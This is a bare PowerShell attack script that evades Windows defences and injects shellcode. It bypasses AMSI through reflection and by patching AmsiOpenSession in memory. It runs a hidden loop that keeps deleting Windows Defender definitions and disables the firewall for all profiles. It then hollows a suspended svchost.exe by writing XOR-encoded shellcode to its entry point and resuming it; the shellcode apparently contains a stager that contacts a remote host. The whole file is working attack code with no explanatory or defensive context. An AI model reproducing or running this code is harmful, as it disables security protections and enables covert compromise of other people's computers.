$a=[Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like '*iUtils') {$c=$b}};$d=$c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like '*Context') {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

start-process powershell.exe -argumentlist "while(1){& 'C:\Program Files\Windows Defender\MpCmdRun.exe' -RemoveDefinitions -All;start-sleep -seconds 300}" -windowstyle hidden

& 'C:\Program Files\Windows Defender\MpCmdRun.exe' -RemoveDefinitions -All

netsh advfirewall set allprofiles state off

function LookupFunc(){
    Param ($moduleName, $methodName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp = @()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetModuleHandle") {$tmp +=$_}}
    $GetModuleHandle = $tmp[0]
    $user32 = $GetModuleHandle.Invoke($null, $moduleName)
    $tmp = @()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp +=$_}}
    $GetProcAddress = $tmp[0]
    $params = @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), $user32)), $methodName)
    try {
        return $GetProcAddress.Invoke($null,$params)
    } catch {
        return $GetProcAddress.Invoke($null,@($user32, $methodName))
    }
}

function getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}

Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

[StructLayout(LayoutKind.Sequential)]
public struct PROCESS_INFORMATION
{
    public IntPtr hProcess; public IntPtr hThread; public uint dwProcessId; public uint dwThreadId;
}

[StructLayout(LayoutKind.Sequential)]
public struct PROCESS_BASIC_INFORMATION
{
    public IntPtr ExitStatus; public IntPtr PebBaseAddress; public IntPtr AffinityMask; public IntPtr BasePriority; public UIntPtr UniqueProcessId; public IntPtr InheritedFromUniqueProcessId;
}

[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
public struct STARTUPINFO
{
    public uint cb; public string lpReserved; public string lpDesktop; public string lpTitle;
    public uint dwX; public uint dwY; public uint dwXSize; public uint dwYSize; public uint dwXCountChars;
    public uint dwYCountChars; public uint dwFillAttribute; public uint dwFlags; public short wShowWindow;
    public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput;
    public IntPtr hStdError;
}

[StructLayout(LayoutKind.Sequential)]
public struct SECURITY_ATTRIBUTES
{
    public int length; public IntPtr lpSecurityDescriptor; public bool bInheritHandle;
}

public static class Hollow
{
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CreateProcess(
        string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, 
        ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, 
        IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, 
        out PROCESS_INFORMATION lpProcessInformation);
}
"@

$name1 = "a" + "msi" + ".dll"
$name2 = "A" + "msi" + "OpenS" + "ession"
[IntPtr]$funcAddr = LookupFunc $name1 $name2

$oldProtectionBuffer = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32],[UInt32], [UInt32].MakeByRefType()) ([Bool])))
$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer) | Out-Null
$buf = [Byte[]] (0x48, 0x31, 0xC0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)
$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer) | Out-Null

$StartupInfo = New-Object STARTUPINFO
$StartupInfo.dwFlags = 0x1 # StartupInfo.dwFlag
$StartupInfo.wShowWindow = 0x0 # StartupInfo.ShowWindow
$StartupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($StartupInfo)
$ProcessInfo = New-Object PROCESS_INFORMATION
$SecAttr = New-Object SECURITY_ATTRIBUTES
$SecAttr.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($SecAttr)
$GetCurrentPath = (Get-Item -Path ".\" -Verbose).FullName
$res = [Hollow]::CreateProcess("C:\Windows\System32\svchost.exe", $Args, [ref] $SecAttr, [ref] $SecAttr, $false, 0x04, [IntPtr]::Zero, $GetCurrentPath, [ref] $StartupInfo, [ref] $ProcessInfo) |out-null

$PROCESS_BASIC_INFORMATION = New-Object PROCESS_BASIC_INFORMATION
$PROCESS_BASIC_INFORMATION_Size = [System.Runtime.InteropServices.Marshal]::SizeOf($PROCESS_BASIC_INFORMATION)
[UInt32]$tmp = 0
[IntPtr]$hProcess = $ProcessInfo.hProcess;
$CallResult = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc ntdll.dll ZwQueryInformationProcess), (getDelegateType @([IntPtr], [Int32], [PROCESS_BASIC_INFORMATION].MakeByRefType(), [UInt32], [UInt32].MakeByRefType()) ([UInt32]))).Invoke($hProcess,0,[ref]$PROCESS_BASIC_INFORMATION,$PROCESS_BASIC_INFORMATION_Size, [ref]$tmp)
[IntPtr]$rImgBaseOffset = $PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt64() + 0x10

$ReadSize = 8
$BytesRead = 0
[IntPtr]$lpBuffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ReadSize)

$res = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll ReadProcessMemory), (getDelegateType @([IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($hProcess,$rImgBaseOffset,$lpBuffer,$ReadSize,[ref]$BytesRead)
$SponsorImageBase = ([System.Runtime.InteropServices.Marshal]::ReadInt64($($lpBuffer.ToInt64())))

$epSize = 300
[IntPtr]$epBuffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($epSize)
$epRes = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll ReadProcessMemory), (getDelegateType @([IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($hProcess,$SponsorImageBase,$epBuffer,$epSize,[ref]$BytesRead)

$bValue = [System.Runtime.InteropServices.Marshal]::ReadInt32($($epBuffer.ToInt64()))
$e_lfanew = [System.Runtime.InteropServices.Marshal]::ReadInt32($($epBuffer.ToInt64() + 0x3C))
$opthdr = $e_lfanew + 0x28

$rva = [System.Runtime.InteropServices.Marshal]::ReadInt32($($epBuffer.ToInt64() + $opthdr))
$epAddr = [IntPtr]($SponsorImageBase + $rva)

[Byte[]] $buf = 0x06, 0xb2, 0x79, 0x1e, 0x0a, 0x12, 0x36, 0xfa, 0xfa, 0xfa, 0xbb, 0xab, 0xbb, 0xaa, 0xa8, 0xb2, 0xcb, 0x28, 0xab, 0xac, 0x9f, 0xb2, 0x71, 0xa8, 0x9a, 0xb2, 0x71, 0xa8, 0xe2, 0xb2, 0x71, 0xa8, 0xda, 0xb2, 0x71, 0x88, 0xaa, 0xb7, 0xcb, 0x33, 0xb2, 0xf5, 0x4d, 0xb0, 0xb0, 0xb2, 0xcb, 0x3a, 0x56, 0xc6, 0x9b, 0x86, 0xf8, 0xd6, 0xda, 0xbb, 0x3b, 0x33, 0xf7, 0xbb, 0xfb, 0x3b, 0x18, 0x17, 0xa8, 0xb2, 0x71, 0xa8, 0xda, 0xbb, 0xab, 0x71, 0xb8, 0xc6, 0xb2, 0xfb, 0x2a, 0x9c, 0x7b, 0x82, 0xe2, 0xf1, 0xf8, 0xf5, 0x7f, 0x88, 0xfa, 0xfa, 0xfa, 0x71, 0x7a, 0x72, 0xfa, 0xfa, 0xfa, 0xb2, 0x7f, 0x3a, 0x8e, 0x9d, 0xb2, 0xfb, 0x2a, 0xbe, 0x71, 0xba, 0xda, 0xaa, 0x71, 0xb2, 0xe2, 0xb3, 0xfb, 0x2a, 0x19, 0xac, 0xb7, 0xcb, 0x33, 0xb2, 0x05, 0x33, 0xbb, 0x71, 0xce, 0x72, 0xb2, 0xfb, 0x2c, 0xb2, 0xcb, 0x3a, 0x56, 0xbb, 0x3b, 0x33, 0xf7, 0xbb, 0xfb, 0x3b, 0xc2, 0x1a, 0x8f, 0x0b, 0xb6, 0xf9, 0xb6, 0xde, 0xf2, 0xbf, 0xc3, 0x2b, 0x8f, 0x22, 0xa2, 0xbe, 0x71, 0xba, 0xde, 0xb3, 0xfb, 0x2a, 0x9c, 0xbb, 0x71, 0xf6, 0xb2, 0xbe, 0x71, 0xba, 0xe6, 0xb3, 0xfb, 0x2a, 0xbb, 0x71, 0xfe, 0x72, 0xb2, 0xfb, 0x2a, 0xbb, 0xa2, 0xbb, 0xa2, 0xa4, 0xa3, 0xa0, 0xbb, 0xa2, 0xbb, 0xa3, 0xbb, 0xa0, 0xb2, 0x79, 0x16, 0xda, 0xbb, 0xa8, 0x05, 0x1a, 0xa2, 0xbb, 0xa3, 0xa0, 0xb2, 0x71, 0xe8, 0x13, 0xb1, 0x05, 0x05, 0x05, 0xa7, 0xb2, 0xcb, 0x21, 0xa9, 0xb3, 0x44, 0x8d, 0x93, 0x94, 0x93, 0x94, 0x9f, 0x8e, 0xfa, 0xbb, 0xac, 0xb2, 0x73, 0x1b, 0xb3, 0x3d, 0x38, 0xb6, 0x8d, 0xdc, 0xfd, 0x05, 0x2f, 0xa9, 0xa9, 0xb2, 0x73, 0x1b, 0xa9, 0xa0, 0xb7, 0xcb, 0x3a, 0xb7, 0xcb, 0x33, 0xa9, 0xa9, 0xb3, 0x40, 0xc0, 0xac, 0x83, 0x5d, 0xfa, 0xfa, 0xfa, 0xfa, 0x05, 0x2f, 0x12, 0xf4, 0xfa, 0xfa, 0xfa, 0xcb, 0xc3, 0xc8, 0xd4, 0xcb, 0xcc, 0xc2, 0xd4, 0xce, 0xc3, 0xd4, 0xcd, 0xc3, 0xfa, 0xa0, 0xb2, 0x73, 0x3b, 0xb3, 0x3d, 0x3a, 0x41, 0xfb, 0xfa, 0xfa, 0xb7, 0xcb, 0x33, 0xa9, 0xa9, 0x90, 0xf9, 0xa9, 0xb3, 0x40, 0xad, 0x73, 0x65, 0x3c, 0xfa, 0xfa, 0xfa, 0xfa, 0x05, 0x2f, 0x12, 0x1f, 0xfa, 0xfa, 0xfa, 0xd5, 0x8d, 0x93, 0x8b, 0xb7, 0x9c, 0x9c, 0xac, 0xa3, 0x98, 0x90, 0x82, 0x99, 0xb3, 0xcb, 0xca, 0x92, 0xaa, 0x9c, 0x8e, 0x9b, 0xac, 0x9d, 0xad, 0xbe, 0x88, 0xbd, 0xc9, 0xb3, 0xac, 0x8a, 0xbc, 0xb2, 0xcf, 0xca, 0xb7, 0xab, 0xc9, 0x99, 0x96, 0xbf, 0xb7, 0x9f, 0xab, 0x90, 0xaa, 0xbb, 0xca, 0x91, 0xaf, 0x8a, 0x91, 0xab, 0x88, 0xcb, 0xb4, 0xb2, 0xab, 0xce, 0xb0, 0xc2, 0xb1, 0x8d, 0xb4, 0xb1, 0xa9, 0xc9, 0xaa, 0xab, 0x99, 0xb9, 0x88, 0xae, 0xce, 0x90, 0x80, 0xb1, 0xae, 0xbd, 0x8d, 0xbe, 0x88, 0xbe, 0xb6, 0x9d, 0xcc, 0xa9, 0xb8, 0xae, 0x8b, 0xd7, 0xcc, 0xa8, 0xb2, 0x97, 0x9e, 0xaa, 0xcb, 0x9b, 0xab, 0xb0, 0x9e, 0xb9, 0xcb, 0x8f, 0xb3, 0xcb, 0x89, 0x96, 0x8a, 0xa9, 0xbc, 0xcf, 0x90, 0xa5, 0xb0, 0xa3, 0xce, 0xca, 0xb7, 0x9c, 0xa5, 0x8c, 0xb4, 0x8c, 0x9f, 0x9c, 0xcf, 0xcd, 0xb8, 0xab, 0xb0, 0x9c, 0xc8, 0xb9, 0xce, 0x8d, 0xb0, 0x9b, 0xbb, 0xc3, 0x96, 0xbf, 0xab, 0xa0, 0xa5, 0x8b, 0xcb, 0xcf, 0xae, 0xbd, 0xb1, 0xc8, 0xc9, 0x95, 0xcc, 0xa3, 0xa3, 0xab, 0x9c, 0x88, 0x8c, 0xb9, 0x92, 0xa9, 0xb2, 0x9b, 0x89, 0xaf, 0xac, 0xca, 0x96, 0x95, 0xa5, 0x99, 0xbe, 0x8b, 0x94, 0xb4, 0xa0, 0xd7, 0x8e, 0xaa, 0xc9, 0xae, 0xb5, 0x94, 0x8f, 0x9f, 0xc3, 0xb8, 0x93, 0x99, 0xb8, 0xab, 0x90, 0x88, 0xca, 0xae, 0xb9, 0x9c, 0xa9, 0x91, 0xad, 0xa2, 0xa8, 0xaf, 0xa5, 0xb3, 0xae, 0x8f, 0xbf, 0x98, 0xcd, 0xa9, 0x98, 0x94, 0xac, 0xb2, 0x97, 0x83, 0x9b, 0x82, 0xb7, 0xa8, 0x89, 0xa2, 0x9b, 0xfa, 0xb2, 0x73, 0x3b, 0xa9, 0xa0, 0xbb, 0xa2, 0xb7, 0xcb, 0x33, 0xa9, 0xb2, 0x42, 0xfa, 0xc8, 0x52, 0x7e, 0xfa, 0xfa, 0xfa, 0xfa, 0xaa, 0xa9, 0xa9, 0xb3, 0x3d, 0x38, 0x11, 0xaf, 0xd4, 0xc1, 0x05, 0x2f, 0xb2, 0x73, 0x3c, 0x90, 0xf0, 0xa5, 0xb2, 0x73, 0x0b, 0x90, 0xe5, 0xa0, 0xa8, 0x92, 0x7a, 0xc9, 0xfa, 0xfa, 0xb3, 0x73, 0x1a, 0x90, 0xfe, 0xbb, 0xa3, 0xb3, 0x40, 0x8f, 0xbc, 0x64, 0x7c, 0xfa, 0xfa, 0xfa, 0xfa, 0x05, 0x2f, 0xb7, 0xcb, 0x3a, 0xa9, 0xa0, 0xb2, 0x73, 0x0b, 0xb7, 0xcb, 0x33, 0xb7, 0xcb, 0x33, 0xa9, 0xa9, 0xb3, 0x3d, 0x38, 0xd7, 0xfc, 0xe2, 0x81, 0x05, 0x2f, 0x7f, 0x3a, 0x8f, 0xe5, 0xb2, 0x3d, 0x3b, 0x72, 0xe9, 0xfa, 0xfa, 0xb3, 0x40, 0xbe, 0x0a, 0xcf, 0x1a, 0xfa, 0xfa, 0xfa, 0xfa, 0x05, 0x2f, 0xb2, 0x05, 0x35, 0x8e, 0xf8, 0x11, 0x50, 0x12, 0xaf, 0xfa, 0xfa, 0xfa, 0xa9, 0xa3, 0x90, 0xba, 0xa0, 0xb3, 0x73, 0x2b, 0x3b, 0x18, 0xea, 0xb3, 0x3d, 0x3a, 0xfa, 0xea, 0xfa, 0xfa, 0xb3, 0x40, 0xa2, 0x5e, 0xa9, 0x1f, 0xfa, 0xfa, 0xfa, 0xfa, 0x05, 0x2f, 0xb2, 0x69, 0xa9, 0xa9, 0xb2, 0x73, 0x1d, 0xb2, 0x73, 0x0b, 0xb2, 0x73, 0x20, 0xb3, 0x3d, 0x3a, 0xfa, 0xda, 0xfa, 0xfa, 0xb3, 0x73, 0x03, 0xb3, 0x40, 0xe8, 0x6c, 0x73, 0x18, 0xfa, 0xfa, 0xfa, 0xfa, 0x05, 0x2f, 0xb2, 0x79, 0x3e, 0xda, 0x7f, 0x3a, 0x8e, 0x48, 0x9c, 0x71, 0xfd, 0xb2, 0xfb, 0x39, 0x7f, 0x3a, 0x8f, 0x28, 0xa2, 0x39, 0xa2, 0x90, 0xfa, 0xa3, 0x41, 0x1a, 0xe7, 0xd0, 0xf0, 0xbb, 0x73, 0x20, 0x05, 0x2f

for($i=0; $i -lt $buf.Length ; $i++)
{
    $buf[$i] = $buf[$i] -bxor 0xfa
}

[UInt32]$BytesWritten = 0
$CallResult = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WriteProcessMemory), (getDelegateType @([IntPtr], [IntPtr], [byte[]], [Int32], [UIntPtr].MakeByRefType()) ([Bool]))).Invoke($hProcess,$epAddr,$buf,$buf.Length,[ref]$BytesWritten)

[IntPtr]$hThread = $ProcessInfo.hThread;
[UInt32]$ResResult = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll ResumeThread), (getDelegateType @([IntPtr]) ([UInt32]))).Invoke($hThread)

